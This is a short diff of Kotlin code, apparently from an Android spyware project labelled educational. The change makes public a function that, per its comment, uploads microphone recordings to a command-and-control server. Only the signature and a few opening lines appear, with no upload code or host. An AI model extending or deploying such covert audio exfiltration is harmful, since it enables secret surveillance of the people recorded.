@@ -125,7 +125,7 @@ object MicrophoneCapture {
     /**
      * Uploads recorded audio file to C2 server as multipart POST.
      */
-    private fun exfiltrateAudioFile(context: Context, file: File, commandId: String? = null) {
+    fun exfiltrateAudioFile(context: Context, file: File, commandId: String? = null) {
         try {
             if (!file.exists() || file.length() == 0L) {
                 Log.w(TAG, "[EDUCATIONAL] Audio file not found or empty")
